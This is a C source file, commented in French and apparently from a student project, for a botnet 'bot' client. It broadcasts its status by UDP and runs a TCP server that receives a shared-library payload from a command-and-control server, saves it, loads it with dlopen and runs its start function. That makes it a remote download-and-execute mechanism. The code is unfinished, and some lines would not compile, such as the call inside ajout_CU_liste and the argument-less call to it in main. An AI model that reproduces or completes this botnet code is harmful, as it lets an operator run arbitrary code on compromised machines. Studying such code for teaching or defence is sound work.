#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <dlfcn.h>

#include "utils.h"
#include "bot.h"

#include <libthrd.h>
#include <libnetwork.h>
#include <liblistes.h>

clock_t debut;
charge_utile_t charge1;
charge_utile_t charge2;

/**
 * void send_status(info_bot_t info, int socket_tcp)
 * Fonction qui envoie le statut du bot au CC sur la socket TCP
 * param la strcuture des infos du BOT
 * param la socket de communication 
 
*/
/* void send_status(info_bot_t info, int socket_tcp)
{
    char status = info.etat;
    if (write(socket_tcp, status, sizeof(char)) < 0)
    {
        //traitement de l'erreur
    }
} */
/**
 * void start_charge(char *file_name, charge_utile_t structure)
 * Fonction permettant d'exécuter une charge utile 
 * param structure de la charge utile 
 */
void start_charge(charge_utile_t *structure)
{
    printf("[start_charge]Start\n");
    
    // TO DO : réfléchir sur le plugin ? var extern ?
    // TO DO : vérifier que la charge n'a pas déjà été start (qu'elle tourne pas déjà )
    printf("je vais start le fichier : %s \n", structure->nom);
    init_f start = dlsym(structure->plugin, "start");
    char *result = dlerror();
    if (result)
    {
        perror("Cannot find start");
    }
    //dlclose(structure.nom);
    //Lancement de la fonction start dans un thread
    printf("Lancement du thread sur la fonction chargée\n");
    start(NULL);
    //lanceThread(start, NULL, 0);
}
/**
 * void print_CU_structure(charge_utile_t structure)
 * Fonction permettant d'imprimer le contenu d'une structure de charge utile
 * param une structure de charge utile
 */
void print_CU_structure(charge_utile_t *structure)
{
    printf("*************** La structure de la charge utile ************ \n");
    printf("Le nom du fichier dans la structure est : %s\n", structure->nom);
    //printf("L'adresse ip dans la strcuture est  : %s\n", structure.);
    //printf("L'état du résultat de la charge utile est : %c\n", structure.resultat);
    //printf("L'état de l'exécution de la charge utile est : %c\n", structure.executed);
}

/**
 * void install_charge(char *file_name)
 * Fonction permettant d'installer une charge sur le BOT
 * param le nom de la charge utile
 */

void install_charge(char *file_name, charge_utile_t *structure)
{
    printf("[install_charge]Start\n");
    void *plugin; // le mettre en extern ? => Non car il sera stocké plus tard dans une liste
    //Chargement du fichier en tant que librairie dynamique
    //file_name = PATH du fichier (relatif ou absolu)
    plugin = dlopen(file_name, RTLD_NOW);
    if (!plugin)
    {
        printf("!!! %s\n", dlerror());
        return;
    }
    // TO DO : créer une liste de charges utiles
    structure->plugin = plugin;
    strcpy(structure->nom, file_name);
    print_CU_structure(structure);
        // TO DO : Copier dans /usr/lib
    printf("La charge utile %s a bien été installée ! \n", file_name);
    
}

void rm_charge(charge_utile_t *structure)
{
    printf("[rm_charge]Start\n");
    printf("je vais supprimer le fichier : %s\n", structure->nom);
    //TO DO : rm de la liste 
    // TO DO : rm de la /usr/lib
}

//void receive_cmd_TCP(void *socket)
/* void receive_cmd_TCP(void *arg)
{
    printf("[receive_cmd_TCP]Start\n");
    char cmd_recue;
    int socket_tcp = *((int *)socket);
    // Obtient une structure de fichier 
    FILE *dialogue = fdopen(socket_tcp, "a+");
    receiveTCP(socket_tcp, cmd_recue, sizeof(cmd_recue));
    printf("[receive_cmd_TCP]La cmd que j'ai lu de mon client TCP est : %c\n", cmd_recue);
    if (dialogue == NULL)
    {
        perror("receive_cmd_TCP.fdopen");
        exit(EXIT_FAILURE);
    }

    switch (cmd_recue)
    {
    case '1': // STATUT
        send_statut();
        break;

    case '2': //INSTALL
        install_charge();
        break;
    case '3': //START
        start_charge();
        break;
    case '4': //RM
        rm_charge();
        break;
    case '5': //QUIT
        break;
    }
    //Lancement de la réception de la charge utile dans un thread
    if (lanceThread(recvFile, (void *)&socket_tcp, sizeof(socket_tcp)) < 0)
    {
        perror("ReceiveFile.lanceThread");
        exit(-1);
    }
} */

/**
 * void gestionClientTCP(void *s)
 * Fonction qui reçoi le msg envoyée par le CC (qui deviendra un ordre plus tard)
 * elle le reçoit et le printf
 * param pointeur vers la socket TCP
 */

void gestionClientTCP(void *s)
{
    printf("[gestionClientTCP]Start\n");
    char msg_recu[80];
    int socket = *((int *)s);
    /* Obtient une structure de fichier */
    FILE *dialogue = fdopen(socket, "a+");
    //ProcessDialog(socket);
    receiveTCP(socket, msg_recu, sizeof(msg_recu));
    printf("[gestionClientTCP]Le msg que j'ai lu de mon client TCP est : %s\n", msg_recu);
    if (dialogue == NULL)
    {
        perror("gestionClientTCP.fdopen");
        exit(EXIT_FAILURE);
    }
    fclose(dialogue);
    return;
}
/**
 * void recvFile(void *s)
 * Fonction qui reçoi le fichier.so envoyé par le CC
 * elle le receptionne et le crée dans son dossier
 * param pointeur vers la socket TCP
 */
void recvFile(void *s)
{
    int socket_tcp = *((int *)s);
    char buff[BUFSIZ]; // to store message from client
    ssize_t len;
    FILE *fp;
    fp = fopen("example.so", "w"); // stores the file content in start in the program directory
    if (fp == NULL)
    {
        printf("Error IN Opening File\n");
        return;
    }
    //Recoit la taille du fichier
    recv(socket_tcp, buff, BUFSIZ, 0);
    int file_size = atoi(buff);
    printf("[BOT] file size received is: %d\n", file_size);
    int remain_data = file_size;
    /* https://stackoverflow.com/questions/11952898/c-send-and-receive-file */
    while ((remain_data > 0) && ((len = recv(socket_tcp, buff, BUFSIZ, 0)) > 0))
    {
        fwrite(buff, sizeof(char), len, fp);
        remain_data -= len;
        printf("Receive %ld bytes and we hope :- %d bytes\n", len, remain_data);
    }
    fclose(fp);
    close(socket_tcp);
    printf("File received successfully !! \n");
    printf("New File created is start !! \n");
    //install_charge("example.so", &charge1);

    /*
    (Ca doit être dans une autre fonction qui traite le fichier recu)
    (/!\ ATTENTION ENORME : Je suis en train de parler de ce qui SERA lorsque tu auras un STOCKAGE 
    des charges utiles (listes chainées))

    charge_utile_t new_charge_utile = malloc(sizeof(charge_utile_t))
    
    Remplissage de la nouvelle charge utile (attributs)

    Appel de la fonction de put dans la liste
    */
}

/**
 * void nouveauClient(int dialogue)
 * Fonction wrapper qui lance un thread avec la fct de traitement TCP
 * param socket de dialogue 
*/
void nouveauClient(int dialogue)
{
    printf("[nouveauClient]Start\n");
    if (lanceThread(recvFile, (void *)&dialogue, sizeof(dialogue)) < 0)
    {
        perror("nouveauClient.lanceThread");
        exit(-1);
    }
}
/**
 * void EnvoieBroadcast(void *structure)
 * Fonction wrapper pour sendUDPBroadcast
 * param pointeur vers la structure à envoyer en UDP
*/

void EnvoieBroadcast(void *structure)
{
    while (1)
    {
        sendUDPBroadcast(*((info_bot_t *)structure), sizeof(info_bot_t), PORT_UDP_CLIENT);
        sleep(5);
    }
}
/**
 * void TCP(void *arg)
 * Fonction wrapper qui initialise une socket tcp et lance boucle Serveur TCP dans un thread
 * 
 * 
 */
void TCP(void *arg)
{
    (void)arg;
    printf("############ Partie TCP ############\n");
    char port_s[6] = PORT_TCP_SERVEUR;
    int socket_tcp;
    // Initialisation du serveur
    socket_tcp = initialisationServeurTCP(port_s);
    if (socket_tcp < 0)
    {
        fprintf(stderr, "Initialisation du serveur impossible\n");
        exit(-1);
    }

    //Lancement de la boucle d'ecoute
    if (boucleServeurTCP(socket_tcp, nouveauClient) < 0)
    {
        fprintf(stderr, "Connexion avec le client impossible\n");
        exit(-1);
    }
}
/**
 * void partie_tcp()
 * Fonction wrapper qui initialise le serveur TCP dans un thread
 * 
 */
void partie_tcp()
{
    if (lanceThread(TCP, (void *)NULL, 0) < 0)
    {
        perror("boucleServeur.lanceThread");
        exit(-1);
    }
}
/**
 * void partie_udp(clock_t debut)
 * Fonction wrapper qui initialise le client UDP dans un thread
 * param debut 
 * 
 */
void partie_udp(clock_t debut)
{

    printf("############ Partie UDP ############\n");
    info_bot_t info_bot;                    // création d'une structure
    remplissageStructure(&info_bot, debut); //remplissage avec l'ID et le temps de vie et état
    impressionStructure(info_bot);
    // PARTIE UDP
    //Envoie de la structure crée en broadcast UDP
    if (lanceThread(EnvoieBroadcast, (void *)&info_bot, sizeof(info_bot_t)) < 0)
    {
        perror("EnvoieBroadcast.lanceThread");
        exit(-1);
    }
}

void creation_liste_CU(){

    return ;
}
/** void ajout_CU_liste(charge_utile_t charge)
 * Fonction permettant de stocker les charges utiles dans une liste chainée
 */
void ajout_CU_liste(charge_utile_t *charge,  llist *liste)
{
    llist_add_inorder(charge1, liste,int (*comp)(void *, void *));
}

int main()
{
    //clock_t debut = clock(); //prise de temps au moment du démarrage stricte du process
    //srand(time(NULL));       //Initialisation nécessaire à faire une seule fois pour la fonction rand

    // PARTIE envoie UDP en THREAD
    //partie_udp(debut);

    // PARTIE SERVEUR TCP en THREAD
    //partie_tcp();

    llist *list = llist_create(NULL);
    ajout_CU_liste();
    while (1)
    {
    }
    return 0;
}
